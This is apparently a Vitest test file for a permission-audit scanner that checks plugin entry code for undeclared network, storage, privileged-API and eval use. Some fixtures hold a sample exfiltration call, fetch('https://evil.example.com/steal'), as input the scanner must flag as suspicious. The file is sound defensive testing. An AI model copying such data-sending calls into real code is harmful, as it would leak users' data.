import { describe, expect, it } from "vitest";
import { buildCapabilityAudit, scanEntrySource } from "./capabilityAudit";

describe("scanEntrySource", () => {
  it("干净源码无发现", () => {
    const source = `
      export const run = () => {
        const title = "fetch( is fine inside a string";
        const comment = "// WebSocket";
        return { ok: true, list: [1, 2, 3] };
      };
    `;
    expect(scanEntrySource(source)).toEqual([]);
  });

  it("检测网络调用与 URL 字面量", () => {
    const source = `
      export const run = async () => {
        await fetch("https://evil.example.com/steal");
        new WebSocket("wss://push.example.com");
      };
    `;
    const findings = scanEntrySource(source);
    const categories = findings.map((finding) => finding.category);
    expect(categories).toContain("network");
    expect(findings.some((finding) => finding.detail.includes("fetch"))).toBe(true);
    expect(
      findings.some((finding) => finding.detail.includes("https://evil.example.com"))
    ).toBe(true);
  });

  it("字符串与注释内的调用形态不误报", () => {
    const source = `
      // fetch("https://example.com")
      const hint = "WebSocket( localStorage indexedDB";
      /* eval("1+1") */
    `;
    expect(scanEntrySource(source)).toEqual([]);
  });

  it("检测存储与特权面用法", () => {
    const source = `
      localStorage.setItem("k", "v");
      window.campusos.something();
      process.env.X;
      eval("1+1");
    `;
    const findings = scanEntrySource(source);
    const categories = new Set(findings.map((finding) => finding.category));
    expect(categories.has("storage")).toBe(true);
    expect(categories.has("privileged")).toBe(true);
    expect(categories.has("eval")).toBe(true);
  });

  it("记录行号", () => {
    const source = "\n\n  fetch('https://a.example.com/x')";
    const finding = scanEntrySource(source).find((item) =>
      item.detail.includes("fetch")
    );
    expect(finding?.line).toBe(3);
  });
});

describe("buildCapabilityAudit", () => {
  const permissions = ["storage:local", "network:https://zju.edu.cn"];

  it("正样例：使用已声明权限 → verified", () => {
    const source = `
      localStorage.setItem("k", "v");
      fetch("https://zju.edu.cn/api/todos");
    `;
    const audit = buildCapabilityAudit({ renderer: source }, permissions);
    expect(audit.status).toBe("verified");
    expect(audit.findings).toEqual([]);
  });

  it("反样例：未声明网络来源 → suspicious", () => {
    const source = `fetch("https://evil.example.com/steal")`;
    const audit = buildCapabilityAudit(
      { renderer: source },
      ["storage:local"]
    );
    expect(audit.status).toBe("suspicious");
    expect(
      audit.findings.some((finding) => finding.detail.includes("evil.example.com"))
    ).toBe(true);
  });

  it("反样例：未声明存储 → suspicious", () => {
    const source = `localStorage.setItem("k", "v")`;
    const audit = buildCapabilityAudit({ renderer: source }, []);
    expect(audit.status).toBe("suspicious");
    expect(audit.findings[0]?.category).toBe("storage");
  });

  it("反样例：特权面 / eval 任何出现即存疑", () => {
    const source = `window.campusos.read(); eval("x")`;
    const audit = buildCapabilityAudit(
      { renderer: source },
      ["storage:local", "network:https://zju.edu.cn"]
    );
    expect(audit.status).toBe("suspicious");
    expect(audit.findings.some((finding) => finding.category === "privileged")).toBe(true);
    expect(audit.findings.some((finding) => finding.category === "eval")).toBe(true);
  });

  it("fetch 无字面量来源时需存在任意 network 声明", () => {
    const noDeclaration = buildCapabilityAudit(
      { renderer: "fetch(x)" },
      ["storage:local"]
    );
    expect(noDeclaration.status).toBe("suspicious");
    const withDeclaration = buildCapabilityAudit(
      { renderer: "fetch(x)" },
      ["storage:local", "network:https://zju.edu.cn"]
    );
    expect(withDeclaration.status).toBe("verified");
  });

  it("main 与 renderer 分别标注来源", () => {
    const audit = buildCapabilityAudit(
      {
        main: "require('node:fs')",
        renderer: "ok()"
      },
      []
    );
    expect(audit.status).toBe("suspicious");
    expect(audit.findings[0]?.detail.startsWith("[main]")).toBe(true);
  });

  it("无入口源码 → verified 且无发现", () => {
    const audit = buildCapabilityAudit({ main: undefined, renderer: undefined }, []);
    expect(audit).toEqual({ status: "verified", findings: [] });
  });
});
